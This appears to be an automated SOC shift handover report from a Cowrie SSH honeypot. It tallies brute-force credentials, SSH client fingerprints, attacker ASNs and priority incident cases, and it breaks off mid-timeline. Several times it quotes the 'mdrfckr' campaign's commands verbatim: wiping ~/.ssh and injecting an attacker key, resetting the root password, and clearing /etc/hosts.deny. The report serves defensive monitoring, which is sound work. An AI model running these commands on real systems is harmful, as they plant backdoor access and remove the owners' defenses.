# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-12 |
| **Generated At** | 2026-05-12T14:33:27Z |
| **Shift Time** | 14:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1427** |
| Confirmed Threats | **1078** |
| False Positives Filtered | **349** (24.5%) |
| Unique Attacker IPs | **58** |
| Countries of Origin | **33** |
| High Severity Cases | **58** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **1369** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **116** |
| Unique Credential Pairs | **41** |
| Unique Usernames | **18** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **38** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 58 |
| `345gs5662d34` | 28 |
| `admin` | 6 |
| `tpaterni` | 2 |
| `david` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 28 |
| `3245gs5662d34` | 28 |
| `123123123a` | 3 |
| `1234` | 3 |
| `123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 28 |
| `root` | `3245gs5662d34` | 28 |
| `root` | `123123123a` | 3 |
| `tpaterni` | `123456` | 2 |
| `root` | `abc123@@@` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123123123a` | `77.237.237.25` | 2026-05-12T10:59:21 |
| `root` | `3245gs5662d34` | `77.237.237.25` | 2026-05-12T10:59:24 |
| `root` | `abc123@@@` | `54.37.229.48` | 2026-05-12T11:10:10 |
| `root` | `3245gs5662d34` | `54.37.229.48` | 2026-05-12T11:10:14 |
| `root` | `123123123a` | `54.37.229.48` | 2026-05-12T11:12:36 |
| `root` | `qwe123!` | `54.37.229.48` | 2026-05-12T11:13:24 |
| `root` | `QWEASDzxc123` | `54.37.229.48` | 2026-05-12T11:14:56 |
| `root` | `hy@123456` | `54.37.229.48` | 2026-05-12T11:15:41 |
| `root` | `!@#123qwe` | `54.37.229.48` | 2026-05-12T11:18:48 |
| `root` | `penis` | `54.37.229.48` | 2026-05-12T11:19:35 |
| `root` | `cyber@123` | `54.37.229.48` | 2026-05-12T11:21:07 |
| `root` | `ankit123` | `54.37.229.48` | 2026-05-12T11:21:55 |
| `root` | `k0nig@000` | `124.228.34.69` | 2026-05-12T11:23:06 |
| `root` | `00000000` | `54.37.229.48` | 2026-05-12T11:24:19 |
| `root` | `all2` | `103.250.11.116` | 2026-05-12T11:34:50 |
| `root` | `3245gs5662d34` | `103.250.11.116` | 2026-05-12T11:34:53 |
| `root` | `bjo` | `189.4.3.135` | 2026-05-12T11:47:52 |
| `root` | `3245gs5662d34` | `189.4.3.135` | 2026-05-12T11:48:03 |
| `root` | `cyber@123` | `90.150.68.44` | 2026-05-12T12:11:07 |
| `root` | `3245gs5662d34` | `90.150.68.44` | 2026-05-12T12:11:21 |
| `root` | `ankit123` | `90.150.68.44` | 2026-05-12T12:14:41 |
| `root` | `00000000` | `90.150.68.44` | 2026-05-12T12:18:00 |
| `root` | `123123123a` | `90.150.68.44` | 2026-05-12T12:19:41 |
| `root` | `!@#123qwe` | `90.150.68.44` | 2026-05-12T12:21:23 |
| `root` | `indigo` | `124.18.182.99` | 2026-05-12T12:25:38 |
| `root` | `3245gs5662d34` | `124.18.182.99` | 2026-05-12T12:25:42 |
| `root` | `marsh` | `186.31.95.163` | 2026-05-12T12:25:43 |
| `root` | `3245gs5662d34` | `186.31.95.163` | 2026-05-12T12:25:50 |
| `root` | `hy@123456` | `90.150.68.44` | 2026-05-12T12:28:09 |
| `root` | `qwe123!` | `90.150.68.44` | 2026-05-12T12:29:49 |
| `root` | `abc123@@@` | `90.150.68.44` | 2026-05-12T12:35:37 |
| `root` | `QWEASDzxc123` | `90.150.68.44` | 2026-05-12T12:37:25 |
| `root` | `penis` | `90.150.68.44` | 2026-05-12T12:40:49 |
| `root` | `` | `219.79.56.86` | 2026-05-12T14:21:28 |
| `root` | `Qwer@2026` | `88.142.46.185` | 2026-05-12T14:23:05 |
| `root` | `3245gs5662d34` | `88.142.46.185` | 2026-05-12T14:23:09 |
| `root` | `Support@2025` | `88.142.46.185` | 2026-05-12T14:25:09 |
| `root` | `w,j[vdsivd` | `88.142.46.185` | 2026-05-12T14:27:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1427** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 113 |
| Unknown | 13 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 108 | 11 |
| `087ab61de4f8...` | Mirai/variant | 10 | 1 |
| `03a80b21afa8...` | Modern SSH client | 5 | 3 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 108 | 11 | libssh-based |
| `087ab61de4f8...` | Unknown | 10 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 5 | 3 | Modern SSH client |
| `95420f9d932d...` | Unknown | 3 | 1 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 28 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:DKqvJk7c74G1"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `124.228.34.69`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `54.37.229.48`, `189.4.3.135`, `90.150.68.44`, `77.237.237.25`, `186.31.95.163`, `88.142.46.185`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **58** |
| Unique ASNs | **52** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS138001` | Galaxy Net | 3 | LOW |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS7303` | Telecom Argentina S.A. | 1 | HIGH |
| `AS40065` | CNSERVERS LLC | 1 | HIGH |
| `AS216472` | High Speed For Internet Services L.L.C | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (58)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3fe26cd5e4b7

| Field | Detail |
|---|---|
| **Source IP** | `77.237.237[.]25` |
| **First Seen** | 2026-05-12 10:59 |
| **Last Seen** | 2026-05-12 10:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 10:59:20` | `cowrie.session.connect` |
| `2026-05-12 10:59:20` | `cowrie.client.version` |
| `2026-05-12 10:59:20` | `cowrie.client.kex` |
| `2026-05-12 10:59:21` | `cowrie.login.success` |
| `2026-05-12 10:59:21` | `cowrie.session.params` |
| `2026-05-12 10:59:21` | `cowrie.command.input` |
| `2026-05-12 10:59:21` | `cowrie.command.failed` |
| `2026-05-12 10:59:21` | `cowrie.log.closed` |
| `2026-05-12 10:59:21` | `cowrie.session.params` |
| `2026-05-12 10:59:21` | `cowrie.command.input` |
| `2026-05-12 10:59:22` | `cowrie.session.file_download` |
| `2026-05-12 10:59:22` | `cowrie.log.closed` |
| `2026-05-12 10:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.237.237[.]25` to AbuseIPDB if not already reported
- [ ] Block `77.237.237[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cca11cf46d6

| Field | Detail |
|---|---|
| **Source IP** | `77.237.237[.]25` |
| **First Seen** | 2026-05-12 10:59 |
| **Last Seen** | 2026-05-12 10:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 10:59:24` | `cowrie.session.connect` |
| `2026-05-12 10:59:24` | `cowrie.client.version` |
| `2026-05-12 10:59:24` | `cowrie.client.kex` |
| `2026-05-12 10:59:24` | `cowrie.login.success` |
| `2026-05-12 10:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.237.237[.]25` to AbuseIPDB if not already reported
- [ ] Block `77.237.237[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86b13973de5b

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:10 |
| **Last Seen** | 2026-05-12 11:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:10:10` | `cowrie.session.connect` |
| `2026-05-12 11:10:10` | `cowrie.client.version` |
| `2026-05-12 11:10:10` | `cowrie.client.kex` |
| `2026-05-12 11:10:10` | `cowrie.login.success` |
| `2026-05-12 11:10:11` | `cowrie.session.params` |
| `2026-05-12 11:10:11` | `cowrie.command.input` |
| `2026-05-12 11:10:11` | `cowrie.command.failed` |
| `2026-05-12 11:10:11` | `cowrie.log.closed` |
| `2026-05-12 11:10:11` | `cowrie.session.params` |
| `2026-05-12 11:10:11` | `cowrie.command.input` |
| `2026-05-12 11:10:11` | `cowrie.session.file_download` |
| `2026-05-12 11:10:11` | `cowrie.log.closed` |
| `2026-05-12 11:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1945a3e09412

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:10 |
| **Last Seen** | 2026-05-12 11:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:10:13` | `cowrie.session.connect` |
| `2026-05-12 11:10:13` | `cowrie.client.version` |
| `2026-05-12 11:10:14` | `cowrie.client.kex` |
| `2026-05-12 11:10:14` | `cowrie.login.success` |
| `2026-05-12 11:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-620a7f787305

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:12 |
| **Last Seen** | 2026-05-12 11:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:12:35` | `cowrie.session.connect` |
| `2026-05-12 11:12:35` | `cowrie.client.version` |
| `2026-05-12 11:12:35` | `cowrie.client.kex` |
| `2026-05-12 11:12:36` | `cowrie.login.success` |
| `2026-05-12 11:12:36` | `cowrie.session.params` |
| `2026-05-12 11:12:36` | `cowrie.command.input` |
| `2026-05-12 11:12:36` | `cowrie.command.failed` |
| `2026-05-12 11:12:36` | `cowrie.log.closed` |
| `2026-05-12 11:12:36` | `cowrie.session.params` |
| `2026-05-12 11:12:36` | `cowrie.command.input` |
| `2026-05-12 11:12:37` | `cowrie.session.file_download` |
| `2026-05-12 11:12:37` | `cowrie.log.closed` |
| `2026-05-12 11:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74060eddca35

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:12 |
| **Last Seen** | 2026-05-12 11:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:12:39` | `cowrie.session.connect` |
| `2026-05-12 11:12:39` | `cowrie.client.version` |
| `2026-05-12 11:12:39` | `cowrie.client.kex` |
| `2026-05-12 11:12:39` | `cowrie.login.success` |
| `2026-05-12 11:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5379af887c7f

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:13 |
| **Last Seen** | 2026-05-12 11:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:13:23` | `cowrie.session.connect` |
| `2026-05-12 11:13:23` | `cowrie.client.version` |
| `2026-05-12 11:13:23` | `cowrie.client.kex` |
| `2026-05-12 11:13:24` | `cowrie.login.success` |
| `2026-05-12 11:13:24` | `cowrie.session.params` |
| `2026-05-12 11:13:24` | `cowrie.command.input` |
| `2026-05-12 11:13:24` | `cowrie.command.failed` |
| `2026-05-12 11:13:24` | `cowrie.log.closed` |
| `2026-05-12 11:13:24` | `cowrie.session.params` |
| `2026-05-12 11:13:24` | `cowrie.command.input` |
| `2026-05-12 11:13:24` | `cowrie.session.file_download` |
| `2026-05-12 11:13:24` | `cowrie.log.closed` |
| `2026-05-12 11:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a981a4d65ef

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:13 |
| **Last Seen** | 2026-05-12 11:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:13:27` | `cowrie.session.connect` |
| `2026-05-12 11:13:27` | `cowrie.client.version` |
| `2026-05-12 11:13:27` | `cowrie.client.kex` |
| `2026-05-12 11:13:27` | `cowrie.login.success` |
| `2026-05-12 11:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bc0505eb5ff

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:14 |
| **Last Seen** | 2026-05-12 11:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:14:55` | `cowrie.session.connect` |
| `2026-05-12 11:14:55` | `cowrie.client.version` |
| `2026-05-12 11:14:55` | `cowrie.client.kex` |
| `2026-05-12 11:14:56` | `cowrie.login.success` |
| `2026-05-12 11:14:56` | `cowrie.session.params` |
| `2026-05-12 11:14:56` | `cowrie.command.input` |
| `2026-05-12 11:14:56` | `cowrie.command.failed` |
| `2026-05-12 11:14:56` | `cowrie.log.closed` |
| `2026-05-12 11:14:57` | `cowrie.session.params` |
| `2026-05-12 11:14:57` | `cowrie.command.input` |
| `2026-05-12 11:14:57` | `cowrie.session.file_download` |
| `2026-05-12 11:14:57` | `cowrie.log.closed` |
| `2026-05-12 11:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc63cdc0385a

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:14 |
| **Last Seen** | 2026-05-12 11:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:14:59` | `cowrie.session.connect` |
| `2026-05-12 11:14:59` | `cowrie.client.version` |
| `2026-05-12 11:14:59` | `cowrie.client.kex` |
| `2026-05-12 11:15:00` | `cowrie.login.success` |
| `2026-05-12 11:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9907780e3478

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:15 |
| **Last Seen** | 2026-05-12 11:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:15:40` | `cowrie.session.connect` |
| `2026-05-12 11:15:40` | `cowrie.client.version` |
| `2026-05-12 11:15:40` | `cowrie.client.kex` |
| `2026-05-12 11:15:41` | `cowrie.login.success` |
| `2026-05-12 11:15:41` | `cowrie.session.params` |
| `2026-05-12 11:15:41` | `cowrie.command.input` |
| `2026-05-12 11:15:41` | `cowrie.command.failed` |
| `2026-05-12 11:15:41` | `cowrie.log.closed` |
| `2026-05-12 11:15:42` | `cowrie.session.params` |
| `2026-05-12 11:15:42` | `cowrie.command.input` |
| `2026-05-12 11:15:42` | `cowrie.session.file_download` |
